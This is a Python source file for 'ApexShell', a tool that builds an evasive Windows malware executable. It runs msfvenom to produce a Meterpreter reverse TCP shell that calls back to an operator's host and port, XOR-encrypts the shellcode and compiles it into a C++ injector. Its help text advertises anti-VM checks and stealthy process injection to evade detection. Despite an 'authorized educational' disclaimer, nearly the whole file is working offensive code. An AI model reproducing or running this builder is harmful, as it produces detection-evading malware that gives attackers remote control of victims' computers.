import argparse
import random
import os
import sys
import time
import string
import subprocess
import re
import shutil

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    BLINK = '\033[5m'

    @staticmethod
    def get_random_color():
        return random.choice([
            Colors.RED, Colors.GREEN, Colors.YELLOW,
            Colors.BLUE, Colors.MAGENTA, Colors.CYAN, Colors.WHITE
        ])

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(message, level="info"):
    prefix = {
        "info": f"{Colors.CYAN}{Colors.BOLD}[*]{Colors.RESET}",
        "success": f"{Colors.GREEN}{Colors.BOLD}[+]{Colors.RESET}",
        "error": f"{Colors.RED}{Colors.BOLD}[-]{Colors.RESET}",
        "warning": f"{Colors.YELLOW}{Colors.BOLD}[!]{Colors.RESET}"
    }.get(level, "[*]")
    
    print(f"{prefix} {message}")

def animate_apexshell():
    print("\033[?25l", end="")  # Hide cursor
    apexshell_lines = [
        "░█████╗░██████╗░███████╗██╗░░██╗███████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░",
        "██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░",
        "███████║██████╔╝█████╗░░░╚███╔╝░███████╗███████║█████╗░░██║░░░░░██║░░░░",
        "██╔══██║██╔═══╝░██╔══╝░░░██╔██╗░╚════██║██╔══██║██╔══╝░░██║░░░░░██║░░░░",
        "██║░░██║██║░░░░░███████╗██╔╝╚██╗███████║██║░░██║███████╗███████╗███████╗",
        "╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝"
    ]
    typed_lines = [""] * len(apexshell_lines)
    max_len = max(len(line) for line in apexshell_lines)

    try:
        for frame_num in range(max_len):
            frame_lines = []
            for i, line in enumerate(apexshell_lines):
                if frame_num < len(line):
                    typed_lines[i] += line[frame_num]
                displayed = typed_lines[i]
                if frame_num < len(line):
                    displayed += Colors.GREEN + "█" + Colors.RESET
                frame_lines.append(f"{Colors.BOLD}{Colors.GREEN}{displayed}{Colors.RESET}")
            print("\033[H\033[J", end="")
            print("\n".join(frame_lines))
            sys.stdout.flush()
            time.sleep(0.04)

        print("\033[H\033[J", end="")
        for line in apexshell_lines:
            print(f"{Colors.BOLD}{Colors.GREEN}{line}{Colors.RESET}")
        print(f"{Colors.RESET}{Colors.YELLOW}v1.0{Colors.RESET}{'':<50}{Colors.CYAN}Developed by isl4r{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(0.5)

        for _ in range(8):
            print("\033[H\033[J", end="")
            for line in apexshell_lines:
                if random.random() < 0.08:
                    spark_pos = random.randint(0, max(0, len(line) - 10))
                    spark = Colors.get_random_color() + "✦" + Colors.RESET
                    sparked_line = line[:spark_pos] + spark + line[spark_pos:]
                    print(f"{Colors.BOLD}{Colors.GREEN}{sparked_line}{Colors.RESET}")
                else:
                    print(f"{Colors.BOLD}{Colors.GREEN}{line}{Colors.RESET}")
            print(f"{Colors.RESET}{Colors.YELLOW}v1.0{Colors.RESET}{'':<50}{Colors.CYAN}Developed by isl4r{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(0.15)

        print("\033[H\033[J", end="")
        for line in apexshell_lines:
            print(f"{Colors.BOLD}{Colors.GREEN}{line}{Colors.RESET}")
        print(f"{Colors.RESET}{Colors.YELLOW}v1.0{Colors.RESET}{'':<50}{Colors.CYAN}Developed by isl4r{Colors.RESET}")
        sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        print("\033[?25h", end="")  # Show cursor again

def print_banner():
    banner = f"""
{Colors.BOLD}{Colors.GREEN}
░█████╗░██████╗░███████╗██╗░░██╗███████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░
███████║██████╔╝█████╗░░░╚███╔╝░███████╗███████║█████╗░░██║░░░░░██║░░░░
██╔══██║██╔═══╝░██╔══╝░░░██╔██╗░╚════██║██╔══██║██╔══╝░░██║░░░░░██║░░░░
██║░░██║██║░░░░░███████╗██╔╝╚██╗███████║██║░░██║███████╗███████╗███████╗
╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
{Colors.RESET}
{Colors.YELLOW}v1.0{Colors.RESET}{'':<50}{Colors.CYAN}Developed by isl4r{Colors.RESET}
"""
    print(banner)

def print_help():
    print_banner()
    help_text = f"""
{Colors.BOLD}{Colors.GREEN}USAGE{Colors.RESET}
  {Colors.CYAN}python secureshell.py [OPTIONS]{Colors.RESET}

{Colors.BOLD}{Colors.GREEN}OPTIONS{Colors.RESET}
  {Colors.YELLOW}-l{Colors.RESET}, {Colors.YELLOW}--lhost{Colors.RESET}   {Colors.WHITE}Set the listening host address{Colors.RESET}      {Colors.CYAN}[required]{Colors.RESET}
  {Colors.YELLOW}-p{Colors.RESET}, {Colors.YELLOW}--lport{Colors.RESET}   {Colors.WHITE}Set the listening port number{Colors.RESET}      {Colors.CYAN}[required]{Colors.RESET}
  {Colors.YELLOW}-h{Colors.RESET}, {Colors.YELLOW}--help{Colors.RESET}    {Colors.WHITE}Show this help message and exit{Colors.RESET}

{Colors.BOLD}{Colors.GREEN}EXAMPLES{Colors.RESET}
  {Colors.WHITE}# Basic usage{Colors.RESET}
  {Colors.CYAN}python secureshell.py -l 192.168.1.100 -p 4444{Colors.RESET}

  {Colors.WHITE}# Show help{Colors.RESET}
  {Colors.CYAN}python secureshell.py --help{Colors.RESET}

{Colors.BOLD}{Colors.GREEN}DESCRIPTION{Colors.RESET}
  {Colors.WHITE}ApexShell{Colors.RESET} generates a Windows x64 Meterpreter reverse shell, encrypted with XOR
  and equipped with VirtualBox anti-VM checks to evade detection. Designed for
  stealthy process injection in authorized educational environments.

{Colors.BOLD}{Colors.RED}DISCLAIMER{Colors.RESET}
  {Colors.YELLOW}Use this tool only on systems you own or have explicit permission to test.
  Unauthorized use is illegal and strictly prohibited.{Colors.RESET}
"""
    print(help_text)
    sys.exit(0)

def loading_bar(task="Processing", duration=2.5):
    bar_length = 60
    sys.stdout.write(f"{Colors.CYAN}{task}:{Colors.RESET} ")
    sys.stdout.flush()
    for i in range(bar_length + 1):
        percent = int((i / bar_length) * 100)
        arrow = f"{Colors.GREEN}>{Colors.RESET}" if i < bar_length else ""
        bar = f"{Colors.GREEN}{'=' * i}{arrow}{' ' * (bar_length - i)}{Colors.RESET}"
        sys.stdout.write(
            f"\r{Colors.CYAN}{task}:{Colors.RESET} [{bar}] {Colors.YELLOW}{percent:3d}%{Colors.RESET}"
        )
        sys.stdout.flush()
        time.sleep(duration / bar_length)
    print()

def generate_random_key():
    """Generate a random key for XOR encryption."""
    length = random.randint(20, 32)
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def xor_encrypt(data: bytes, key: str):
    """XOR encrypt binary data with the given key."""
    key_bytes = key.encode()
    encrypted = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
    c_array = '{ 0x' + ', 0x'.join(f'{b:02x}' for b in encrypted) + ' };'
    return c_array, key

def generate_payload(host, port, log):
    """Generate a reverse shell payload using msfvenom."""
    output_path = "build/hack.bin"
    os.makedirs("build", exist_ok=True)
    msfv = (
        f"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={host} "
        f"LPORT={port} -f raw -o {output_path}"
    )

    try:
        result = subprocess.run(msfv, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        with open(output_path, "rb") as f:
            log("Payload generated successfully.", "success")
            return f.read()
    except FileNotFoundError:
        log("msfvenom was not found! Please install Metasploit Framework and ensure 'msfvenom' is in your PATH.", "error")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        log("msfvenom failed to generate the payload.", "error")
        log(f"Error output: {e.stderr.decode().strip()}", "error")
        sys.exit(1)
    except Exception as e:
        log(f"Unexpected error: {e}", "error")
        sys.exit(1)

def compile_cpp(ciphertext, key, output_exe, log):
    template_path = "src/injector.cpp"
    output_cpp = "src/temp_secure_injector.cpp"
    inject_payload_and_key(template_path, output_cpp, ciphertext, key)
    log("C++ source file generated.", "success")

    cmd = (
        f"x86_64-w64-mingw32-g++ -O2 {output_cpp} -o \"{output_exe}\" "
        "-I/usr/share/mingw-w64/include/ "
        "-s -ffunction-sections -fdata-sections "
        "-Wno-write-strings -fno-exceptions -fmerge-all-constants "
        "-static-libstdc++ -static-libgcc -fpermissive"
    )
    log("Compiling final executable...", "info")
    try:
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        log(f"C++ compilation completed successfully. Output: {output_exe}", "success")
    except subprocess.CalledProcessError as e:
        log("Compilation failed.", "error")
        log(f"Error output: {e.stderr.decode().strip()}", "error")
        sys.exit(1)
    except Exception as e:
        log(f"Unexpected error during compilation: {e}", "error")
        sys.exit(1)

def inject_payload_and_key(template_path, output_cpp, ciphertext, key):
    # Read the template
    with open(template_path, "r", encoding="utf-8") as f:
        cpp_code = f.read()
    # Replace the payload and key lines
    cpp_code = re.sub(
        r'unsigned char encryptedPayload\[\] = \{.*?\};',
        f'unsigned char encryptedPayload[] = {ciphertext};',
        cpp_code,
        flags=re.DOTALL
    )
    cpp_code = re.sub(
        r'char decryptionKey\[\] = ".*?";',
        f'char decryptionKey[] = "{key}";',
        cpp_code
    )
    # Write to output_cpp
    with open(output_cpp, "w", encoding="utf-8") as f:
        f.write(cpp_code)

def main(host, port, output_exe, log=log):
    clear_screen()
    animate_apexshell()

    log(f"Target Host: {Colors.MAGENTA}{host}{Colors.RESET}")
    log(f"Target Port: {Colors.MAGENTA}{port}{Colors.RESET}")
    log(f"Output File: {Colors.MAGENTA}{output_exe}{Colors.RESET}")

    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError("Port must be between 1 and 65535")
    except ValueError as e:
        log(f"Invalid port number: {e}", "error")
        sys.exit(1)

    log("Generating reverse shell payload with msfvenom...", "info")
    loading_bar("Generating payload", 2.5)
    payload = generate_payload(host, port, log)

    log("Encrypting payload...", "info")
    loading_bar("Encrypting payload", 1.5)
    key = generate_random_key()
    ciphertext, payload_key = xor_encrypt(payload, key)

    log("Compiling final executable...", "info")
    loading_bar("Compiling C++", 2.0)
    compile_cpp(ciphertext, payload_key, output_exe, log)

    log("All done!", "success")
    print(f"{Colors.BOLD}{Colors.YELLOW}XOR Key:{Colors.RESET} {Colors.CYAN}{payload_key}{Colors.RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ApexShell: Educational Payload Generator", add_help=False)
    parser.add_argument('-l', '--lhost', help="Your LHOST")
    parser.add_argument('-p', '--lport', help="Your LPORT")
    parser.add_argument('-o', '--output', help="Output executable path or filename (e.g., test.exe or /path/to/test.exe)", default="secureshell.exe")
    parser.add_argument('-h', '--help', action='store_true', help="Show help message and exit")
    args = parser.parse_args()

    if args.help or not (args.lhost and args.lport):
        print_help()
    else:
        main(args.lhost, args.lport, args.output)
